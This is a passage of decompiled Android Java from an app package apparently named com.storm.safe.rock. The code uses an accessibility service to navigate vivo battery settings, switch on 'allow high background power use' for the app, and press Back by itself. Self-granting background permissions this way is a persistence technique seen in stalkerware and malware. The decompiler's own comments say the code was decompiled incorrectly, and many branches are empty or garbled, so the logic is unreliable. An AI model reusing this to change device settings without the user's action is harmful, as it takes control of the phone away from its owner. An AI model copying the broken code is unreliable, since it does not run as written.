                        t60.m214704c5(c0371a8.f55141a2, "[电池-后台耗电] ❌ 未找到后台耗电管理/后台高耗电");
                        return Boolean.FALSE;
                    }
                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a8;
                    vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str2;
                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 2;
                    if (m212385g6(c0371a8, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                        str3 = str2;
                        vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a8;
                        vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str3;
                        vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 3;
                        if (c0371a8.m212436g4(5, 10000L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                            tz0.m214809a9("[电池-后台耗电] 🔍 方式1: 尝试在列表页直接打开开关「", str3, "」", c0371a8.f55141a2);
                            vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a8;
                            vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str3;
                            vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 0;
                            vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = 0;
                            vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 4;
                            objM212430f8 = c0371a8.m212430f8(10, str3, vivoSteps$executeBatteryBackgroundPower$1, true);
                            if (objM212430f8 != coroutineSingletons) {
                                str4 = str3;
                                c0371a82 = c0371a8;
                                i = 0;
                                i2 = 0;
                                if (((Boolean) objM212430f8).booleanValue()) {
                                    i3 = i2;
                                    if (i3 != 0) {
                                    }
                                } else {
                                    t60.m214704c5(c0371a82.f55141a2, "[电池-后台耗电] ✅ 方式1成功: 开关已打开");
                                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a82;
                                    vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str4;
                                    vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 1;
                                    vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = 0;
                                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 5;
                                    if (b81.m210571b1(300L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                        i = 0;
                                        i3 = 1;
                                        rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
                                        if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("允许后台高耗电")) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                            it = listFindAccessibilityNodeInfosByText.iterator();
                                            while (it.hasNext()) {
                                                if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                                    objArr = true;
                                                    if (rootInActiveWindow != null) {
                                                        rootInActiveWindow.recycle();
                                                    }
                                                    if (objArr != false) {
                                                        t60.m214726f4(c0371a82.f55141a2, "[电池-后台耗电] ⚠️ 方式1误判: 实际进入了详情页，继续处理...");
                                                        i3 = 0;
                                                        i = 1;
                                                    }
                                                    if (i3 != 0) {
                                                        t60.m214704c5(c0371a82.f55141a2, "[电池-后台耗电] 🔍 方式2: 尝试通过 ViewID 进入详情页");
                                                        vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a82;
                                                        vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str4;
                                                        vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = i3;
                                                        vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = i;
                                                        vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 6;
                                                        objM212430f8 = c0371a82.m212387a4(str4, vivoSteps$executeBatteryBackgroundPower$1);
                                                        if (objM212430f8 != coroutineSingletons) {
                                                            if (((Boolean) objM212430f8).booleanValue()) {
                                                                if (i3 == 0) {
                                                                }
                                                                c0371a84 = c0371a82;
                                                                i4 = i3;
                                                                if (i4 == 0) {
                                                                }
                                                                i7 = i;
                                                                if (i4 == 0) {
                                                                }
                                                            } else {
                                                                t60.m214704c5(c0371a82.f55141a2, "[电池-后台耗电] ✅ 方式2: 成功进入详情页");
                                                                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a82;
                                                                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str4;
                                                                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 7;
                                                                if (b81.m210571b1(800L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                    str5 = str4;
                                                                    c0371a83 = c0371a82;
                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a83;
                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str5;
                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 1;
                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 8;
                                                                    objM212430f8 = c0371a83.m212389a6(vivoSteps$executeBatteryBackgroundPower$1);
                                                                    if (objM212430f8 != coroutineSingletons) {
                                                                        i = 1;
                                                                        c0371a82 = c0371a83;
                                                                        str4 = str5;
                                                                        i3 = ((Boolean) objM212430f8).booleanValue() ? 1 : 0;
                                                                        if (i3 == 0) {
                                                                            t60.m214704c5(c0371a82.f55141a2, "[电池-后台耗电] 🔍 方式3: 尝试通过应用名称文本进入详情页");
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a82;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str4;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = i3;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = i;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 9;
                                                                            objM212430f8 = c0371a82.m212393b0(str4, 1, 20, vivoSteps$executeBatteryBackgroundPower$1);
                                                                            if (objM212430f8 != coroutineSingletons) {
                                                                                if (((Boolean) objM212430f8).booleanValue()) {
                                                                                    t60.m214704c5(c0371a82.f55141a2, "[电池-后台耗电] ✅ 方式3: 成功点击应用名称");
                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a82;
                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str4;
                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 10;
                                                                                    if (b81.m210571b1(800L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                                        c0371a84 = c0371a82;
                                                                                        str6 = str4;
                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a84;
                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str6;
                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 1;
                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 11;
                                                                                        objM212430f8 = c0371a84.m212389a6(vivoSteps$executeBatteryBackgroundPower$1);
                                                                                        if (objM212430f8 != coroutineSingletons) {
                                                                                            i = 1;
                                                                                            str4 = str6;
                                                                                            i4 = ((Boolean) objM212430f8).booleanValue() ? 1 : 0;
                                                                                            if (i4 == 0 && Build.VERSION.SDK_INT < 29) {
                                                                                                t60.m214704c5(c0371a84.f55141a2, "[电池-后台耗电] 🔍 方式4: 尝试 SDK<29 专用开关");
                                                                                                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a84;
                                                                                                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = null;
                                                                                                vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = i4;
                                                                                                vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = i;
                                                                                                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 12;
                                                                                                objM212430f8 = c0371a84.m212394b1(str4, vivoSteps$executeBatteryBackgroundPower$1);
                                                                                                break;
                                                                                            }
                                                                                            i7 = i;
                                                                                            if (i4 == 0) {
                                                                                                t60.m214704c5(c0371a84.f55141a2, "[电池-后台耗电] ❌ 所有方式都失败");
                                                                                                return Boolean.FALSE;
                                                                                            }
                                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a84;
                                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = null;
                                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = i7;
                                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 13;
                                                                                            if (b81.m210571b1(500L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                                                c0371a85 = c0371a84;
                                                                                                i5 = i7;
                                                                                                if (i5 == 0) {
                                                                                                    t60.m214704c5(c0371a85.f55141a2, "[电池-后台耗电] ↩️ 返回2次 (详情页→列表→电池页)");
                                                                                                    c0371a85.f55139a0.performGlobalAction(1);
                                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a85;
                                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 14;
                                                                                                    if (b81.m210571b1(300L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                                                        c0371a87 = c0371a85;
                                                                                                        c0371a87.f55139a0.performGlobalAction(1);
                                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a87;
                                                                                                        vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 15;
                                                                                                        if (b81.m210571b1(300L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                                                            c0371a86 = c0371a87;
                                                                                                            c0371a86.f55142a3.m214998b3("vivo_battery_background_done");
                                                                                                            t60.m214704c5(c0371a86.f55141a2, "[电池-后台耗电] ✅✅✅ 后台耗电设置完成");
                                                                                                            return Boolean.TRUE;
                                                                                                        }
                                                                                                    }
                                                                                                } else {
                                                                                                    t60.m214704c5(c0371a85.f55141a2, "[电池-后台耗电] ↩️ 返回1次 (列表→电池页)");
                                                                                                    c0371a85.f55139a0.performGlobalAction(1);
                                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a85;
                                                                                                    vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 16;
                                                                                                    if (b81.m210571b1(300L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                                                                                                        c0371a86 = c0371a85;
                                                                                                        c0371a86.f55142a3.m214998b3("vivo_battery_background_done");
                                                                                                        t60.m214704c5(c0371a86.f55141a2, "[电池-后台耗电] ✅✅✅ 后台耗电设置完成");
                                                                                                        return Boolean.TRUE;
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                        c0371a84 = c0371a82;
                                                                        i4 = i3;
                                                                        if (i4 == 0) {
                                                                            t60.m214704c5(c0371a84.f55141a2, "[电池-后台耗电] 🔍 方式4: 尝试 SDK<29 专用开关");
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a84;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = null;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = i4;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = i;
                                                                            vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 12;
                                                                            objM212430f8 = c0371a84.m212394b1(str4, vivoSteps$executeBatteryBackgroundPower$1);
                                                                        }
                                                                        i7 = i;
                                                                        if (i4 == 0) {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        objArr = false;
                                        if (rootInActiveWindow != null) {
                                        }
                                        if (objArr != false) {
                                        }
                                        if (i3 != 0) {
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                String str7 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                c0371a8 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                objM212393b0 = objM212430f8;
                str2 = str7;
                if (((Boolean) objM212393b0).booleanValue()) {
                }
                break;
            case 2:
                str3 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                c0371a8 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a8;
                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str3;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 3;
                if (c0371a8.m212436g4(5, 10000L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                str3 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                c0371a8 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                tz0.m214809a9("[电池-后台耗电] 🔍 方式1: 尝试在列表页直接打开开关「", str3, "」", c0371a8.f55141a2);
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a8;
                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str3;
                vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 0;
                vivoSteps$executeBatteryBackgroundPower$1.f54844a3 = 0;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 4;
                objM212430f8 = c0371a8.m212430f8(10, str3, vivoSteps$executeBatteryBackgroundPower$1, true);
                if (objM212430f8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54844a3;
                int i8 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                String str8 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a88 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a82 = c0371a88;
                i2 = i8;
                str4 = str8;
                if (((Boolean) objM212430f8).booleanValue()) {
                }
                break;
            case 5:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54844a3;
                i3 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                str4 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a89 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a82 = c0371a89;
                rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    it = listFindAccessibilityNodeInfosByText.iterator();
                    while (it.hasNext()) {
                    }
                    break;
                }
                objArr = false;
                if (rootInActiveWindow != null) {
                }
                if (objArr != false) {
                }
                if (i3 != 0) {
                }
                return coroutineSingletons;
            case 6:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54844a3;
                i3 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                str4 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a810 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a82 = c0371a810;
                if (((Boolean) objM212430f8).booleanValue()) {
                }
                return coroutineSingletons;
            case 7:
                String str9 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a811 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a83 = c0371a811;
                str5 = str9;
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a83;
                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str5;
                vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 1;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 8;
                objM212430f8 = c0371a83.m212389a6(vivoSteps$executeBatteryBackgroundPower$1);
                if (objM212430f8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                str5 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                c0371a83 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a82 = c0371a83;
                str4 = str5;
                i3 = ((Boolean) objM212430f8).booleanValue() ? 1 : 0;
                if (i3 == 0) {
                }
                c0371a84 = c0371a82;
                i4 = i3;
                if (i4 == 0) {
                }
                i7 = i;
                if (i4 == 0) {
                }
                break;
            case 9:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54844a3;
                i3 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                str4 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a812 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a82 = c0371a812;
                if (((Boolean) objM212430f8).booleanValue()) {
                }
                c0371a84 = c0371a82;
                i4 = i3;
                if (i4 == 0) {
                }
                i7 = i;
                if (i4 == 0) {
                }
                break;
            case 10:
                String str10 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                C0371a8 c0371a813 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a84 = c0371a813;
                str6 = str10;
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a84;
                vivoSteps$executeBatteryBackgroundPower$1.f54842a1 = str6;
                vivoSteps$executeBatteryBackgroundPower$1.f54843a2 = 1;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 11;
                objM212430f8 = c0371a84.m212389a6(vivoSteps$executeBatteryBackgroundPower$1);
                if (objM212430f8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                str6 = vivoSteps$executeBatteryBackgroundPower$1.f54842a1;
                c0371a84 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                str4 = str6;
                i4 = ((Boolean) objM212430f8).booleanValue() ? 1 : 0;
                if (i4 == 0) {
                }
                i7 = i;
                if (i4 == 0) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                i = vivoSteps$executeBatteryBackgroundPower$1.f54844a3;
                i4 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                c0371a84 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                if (((Boolean) objM212430f8).booleanValue()) {
                    t60.m214704c5(c0371a84.f55141a2, "[电池-后台耗电] ✅ 方式4成功");
                    i4 = 1;
                } else {
                    i7 = i;
                }
                if (i4 == 0) {
                }
                break;
            case 13:
                i5 = vivoSteps$executeBatteryBackgroundPower$1.f54843a2;
                c0371a85 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                if (i5 == 0) {
                }
                return coroutineSingletons;
            case 14:
                c0371a87 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a87.f55139a0.performGlobalAction(1);
                vivoSteps$executeBatteryBackgroundPower$1.f54841a0 = c0371a87;
                vivoSteps$executeBatteryBackgroundPower$1.f54847a6 = 15;
                if (b81.m210571b1(300L, vivoSteps$executeBatteryBackgroundPower$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
            case 16:
                c0371a86 = vivoSteps$executeBatteryBackgroundPower$1.f54841a0;
                kg1.m213544f4(objM212430f8);
                c0371a86.f55142a3.m214998b3("vivo_battery_background_done");
                t60.m214704c5(c0371a86.f55141a2, "[电池-后台耗电] ✅✅✅ 后台耗电设置完成");
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:126:0x02cc, code lost:
    
        if (p000.b81.m210571b1(500, r9) != r2) goto L128;
     */
    /* JADX WARN: Code restructure failed: missing block: B:128:0x02cf, code lost:
    
        r2 = r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:139:0x0308, code lost:
    
        if (p000.b81.m210571b1(r4, r9) != r2) goto L128;
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x0154, code lost:
    
        if (r6 == r2) goto L140;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:0x01d8, code lost:
    
        if (p000.b81.m210571b1(300, r9) == r2) goto L140;
     */
    /* JADX WARN: Code restructure failed: missing block: B:98:0x0244, code lost:
    
        if (p000.b81.m210571b1(r6, r9) == r2) goto L140;
     */
    /* JADX WARN: Removed duplicated region for block: B:102:0x0254  */
    /* JADX WARN: Removed duplicated region for block: B:104:0x025e  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0276  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x028d  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x029e A[PHI: r1 r3 r6
      0x029e: PHI (r1v43 boolean) = (r1v41 boolean), (r1v44 boolean) binds: [B:115:0x029a, B:19:0x006c] A[DONT_GENERATE, DONT_INLINE]
      0x029e: PHI (r3v51 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v49 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v52 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:115:0x029a, B:19:0x006c] A[DONT_GENERATE, DONT_INLINE]
      0x029e: PHI (r6v25 long) = (r6v24 long), (r6v0 long) binds: [B:115:0x029a, B:19:0x006c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:120:0x02ab A[PHI: r1 r3
      0x02ab: PHI (r1v45 boolean) = (r1v43 boolean), (r1v47 boolean) binds: [B:118:0x02a8, B:18:0x0064] A[DONT_GENERATE, DONT_INLINE]
      0x02ab: PHI (r3v53 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v51 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v54 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:118:0x02a8, B:18:0x0064] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:122:0x02b1  */
    /* JADX WARN: Removed duplicated region for block: B:129:0x02d1  */
    /* JADX WARN: Removed duplicated region for block: B:135:0x02ef A[PHI: r1 r3 r4
      0x02ef: PHI (r1v52 boolean) = (r1v50 boolean), (r1v54 boolean) binds: [B:133:0x02ec, B:14:0x0042] A[DONT_GENERATE, DONT_INLINE]
      0x02ef: PHI (r3v59 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v57 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v60 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:133:0x02ec, B:14:0x0042] A[DONT_GENERATE, DONT_INLINE]
      0x02ef: PHI (r4v44 long) = (r4v42 long), (r4v45 long) binds: [B:133:0x02ec, B:14:0x0042] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:138:0x02fe A[PHI: r3 r4
      0x02fe: PHI (r3v62 com.storm.safe.rock.service.modules.yw5xud.a8) = (r3v59 com.storm.safe.rock.service.modules.yw5xud.a8), (r3v63 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:136:0x02fb, B:13:0x0039] A[DONT_GENERATE, DONT_INLINE]
      0x02fe: PHI (r4v46 long) = (r4v44 long), (r4v47 long) binds: [B:136:0x02fb, B:13:0x0039] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:42:0x0116  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x012b  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0144  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0148  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0166  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0187  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x019e  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x01b8 A[PHI: r1 r3 r4
      0x01b8: PHI (r1v25 boolean) = (r1v13 boolean), (r1v32 boolean), (r1v35 boolean) binds: [B:54:0x0146, B:79:0x01b6, B:63:0x0164] A[DONT_GENERATE, DONT_INLINE]
      0x01b8: PHI (r3v20 int) = (r3v9 int), (r3v27 int), (r3v33 int) binds: [B:54:0x0146, B:79:0x01b6, B:63:0x0164] A[DONT_GENERATE, DONT_INLINE]
      0x01b8: PHI (r4v18 com.storm.safe.rock.service.modules.yw5xud.a8) = 
      (r4v9 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r4v21 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r4v24 com.storm.safe.rock.service.modules.yw5xud.a8)
     binds: [B:54:0x0146, B:79:0x01b6, B:63:0x0164] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:81:0x01bc  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01df  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x0018  */
    /* JADX WARN: Removed duplicated region for block: B:93:0x0224 A[PHI: r1 r3 r4 r5 r6 r11
      0x0224: PHI (r1v28 boolean) = (r1v24 boolean), (r1v31 boolean) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]
      0x0224: PHI (r3v24 int) = (r3v19 int), (r3v25 int) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]
      0x0224: PHI (r4v19 int) = (r4v17 int), (r4v20 int) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]
      0x0224: PHI (r5v10 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v11 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]
      0x0224: PHI (r6v7 long) = (r6v0 long), (r6v8 long) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]
      0x0224: PHI (r11v2 java.lang.Object) = (r11v1 java.lang.Object), (r11v7 java.lang.Object) binds: [B:23:0x0092, B:91:0x0220] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x022c  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x0236  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:82:0x01d8 -> B:84:0x01dc). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:86:0x01f9 -> B:84:0x01dc). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:98:0x0244 -> B:100:0x0248). Please report as a decompilation issue!!! */
    /* renamed from: b7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212399b7(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeBatteryMethodN$1 vivoSteps$executeBatteryMethodN$1;
        C0371a8 c0371a8;
        int i;
        boolean z;
        C0371a8 c0371a82;
        Object objM212419e7;
        int i2;
        int i3;
        int i4;
        C0371a8 c0371a83;
        Object objM212393b0;
        C0371a8 c0371a84;
        Object objM212419e72;
        Object objM212393b02;
        C0371a8 c0371a85;
        long j;
        if (continuationImpl instanceof VivoSteps$executeBatteryMethodN$1) {
            vivoSteps$executeBatteryMethodN$1 = (VivoSteps$executeBatteryMethodN$1) continuationImpl;
            int i5 = vivoSteps$executeBatteryMethodN$1.f54853a5;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBatteryMethodN$1.f54853a5 = i5 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeBatteryMethodN$1 = new VivoSteps$executeBatteryMethodN$1(this, continuationImpl);
            }
        }
        VivoSteps$executeBatteryMethodN$1 vivoSteps$executeBatteryMethodN$12 = vivoSteps$executeBatteryMethodN$1;
        Object objM212393b03 = vivoSteps$executeBatteryMethodN$12.f54851a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = 4;
        long j2 = 800;
        long j3 = 300;
        switch (vivoSteps$executeBatteryMethodN$12.f54853a5) {
            case 0:
                kg1.m213544f4(objM212393b03);
                if (!m212417e5()) {
                    vivoSteps$executeBatteryMethodN$12.f54848a0 = this;
                    vivoSteps$executeBatteryMethodN$12.f54849a1 = 0;
                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 1;
                    objM212393b03 = m212393b0("电池", 0, 0, vivoSteps$executeBatteryMethodN$12);
                    if (objM212393b03 != coroutineSingletons) {
                        c0371a8 = this;
                        i = 0;
                        if (((Boolean) objM212393b03).booleanValue()) {
                            vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                            vivoSteps$executeBatteryMethodN$12.f54849a1 = i;
                            vivoSteps$executeBatteryMethodN$12.f54853a5 = 2;
                            if (b81.m210571b1(800L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                if (!c0371a8.m212417e5()) {
                                    vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
                                    vivoSteps$executeBatteryMethodN$12.f54853a5 = 3;
                                    z = false;
                                    C0371a8 c0371a86 = c0371a8;
                                    if (c0371a86.m212437g5(3, 50L, 1500L, vivoSteps$executeBatteryMethodN$12) != coroutineSingletons) {
                                        c0371a82 = c0371a86;
                                        c0371a8 = c0371a82;
                                        i = 1;
                                        if (i != 0) {
                                        }
                                    }
                                }
                            }
                        }
                        z = false;
                        if (i != 0) {
                        }
                    }
                    return coroutineSingletons;
                }
                c0371a8 = this;
                z = false;
                i = 1;
                if (i != 0) {
                    j3 = 300;
                    if (i != 0) {
                        vivoSteps$executeBatteryMethodN$12.f54848a0 = c0371a8;
